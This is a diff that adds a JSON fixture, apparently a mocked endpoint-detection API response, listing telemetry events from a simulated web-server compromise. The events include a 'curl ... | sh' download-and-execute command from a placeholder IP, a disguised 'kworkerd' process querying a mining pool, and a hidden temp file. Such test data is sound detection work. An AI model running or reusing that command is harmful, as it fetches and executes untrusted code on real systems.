@@ -1,0 +1,10 @@
+{
+    "pagination": {"nextCursor": "Y3Vyc29yLXBhZ2UtMg==", "totalItems": null},
+    "data": [
+        {"objectType": "process", "createdAt": "2026-11-21T03:14:02.120Z", "processName": "bash", "pid": "2211", "parentProcessName": "php-fpm8.1", "processUserName": "www-data", "processCmd": "bash -c curl -fsSL http://203.0.113.77/i.sh | sh", "sha1": "4444444444444444444444444444444444444444"},
+        {"objectType": "process", "createdAt": "2026-11-21T03:14:02.480Z", "processName": "curl", "pid": "2212", "parentProcessName": "bash", "processUserName": "www-data", "processCmd": "curl -fsSL http://203.0.113.77/i.sh"},
+        {"objectType": "dns", "createdAt": "2026-11-21T03:14:09.000Z", "processName": "kworkerd", "dnsRequest": "pool.example.test", "dnsResponse": null},
+        {"objectType": "ip", "createdAt": "2026-11-21T03:14:02.600Z", "processName": "curl", "direction": "OUTGOING", "srcIp": "192.0.2.20", "srcPort": 41000, "dstIp": "203.0.113.77", "dstPort": 80},
+        {"objectType": "file", "createdAt": "2026-11-21T03:14:03.000Z", "processName": "sh", "eventType": "File Creation", "fileFullName": "/tmp/.X11-cache/kworkerd.part", "fileSha1": null}
+    ]
+}
